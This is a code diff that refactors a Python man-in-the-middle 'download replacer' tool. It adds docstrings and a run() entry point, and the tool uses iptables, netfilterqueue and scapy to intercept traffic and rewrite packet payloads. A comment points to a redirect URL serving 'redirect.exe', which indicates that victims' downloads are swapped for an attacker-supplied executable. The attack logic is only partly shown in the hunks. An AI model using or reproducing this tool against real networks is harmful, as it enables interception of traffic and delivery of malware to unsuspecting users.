@@ -1,5 +1,3 @@
-#!usr/bin/env python
-
 #########################################################################
 # Author : Dhrumil Mistry
 #########################################################################
@@ -38,11 +36,16 @@ import scapy.all as scapy
 # REDIRECT = b'10.0.2.15/redirect.exe'
 
 
-############################### Functions ############################### 
 def forward_packets():
     '''
     configures the mitm for incoming request packets
     into a queue.
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
 
     # executing the following command
@@ -62,7 +65,13 @@ def forward_packets():
 def reset_config():
     '''
     resets the configurations changed while exectution of the program to 
-    its original configuration.
+    its original configuration
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     call('sudo iptables --flush', shell=True)
 
@@ -70,6 +79,15 @@ def reset_config():
 ack_list = []
 
 def set_load(packet, load):
+    '''sets the packet raw layer load value to the passed load value
+
+    Args:
+        packet (scapy.IP): scapy IP packet
+        load (bytes): payload data as bytes
+
+    Returns:
+        scapy.IP: returns packet with load
+    '''
     packet[scapy.Raw].load = load
 
     # since now the packet has been tampered, the new 
@@ -87,6 +105,12 @@ def process_packet(packet):
     process received packet, everytime a packet is received.
     prints the packet received in the queue and it changes 
     the DNS response dest ip with your desired ip.
+
+    Args:
+        packet (scapy.IP): packet from netfilterqueue/iptables
+
+    Returns:
+        None
     '''
     scapy_pkt = scapy.IP(packet.get_payload())
 
@@ -115,32 +139,43 @@ def process_packet(packet):
     packet.accept()
     
 
-############################### Main ############################### 
+def run():
+    '''Starts download replacer
+    
+    Args:
+        None
 
-print('[*] configuring packet receiver...')
+    Returns:
+        None
+    '''
+    print('[*] configuring packet receiver...')
 
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
+    forward_packets()
+    print('[*] packet receiver configured successfully.\n')
 
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
+    print('[*] Creating Queue to start receiving packets.')
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        # Bind queue with queue-number 0
+        queue.bind(0, process_packet)
+        queue.run()
 
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
+    except OSError as e:
+        print('[-] Run script with root priviliges.')
+        print(e)
 
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
+    except KeyboardInterrupt:
+        print('\r[-] Keyboard Interrupt detected!')
 
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
+    except Exception:
+        print('[-] An Exception occurred while creating queue.\n', Exception)
 
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
+    finally:
+        print('[*] Restoring previous configurations.. please be patient...')
+        reset_config()
 
-    print('[-] Program stopped.')
+        print('[-] Program stopped.')
+
+
+if __name__ == '__main__':
+    run()
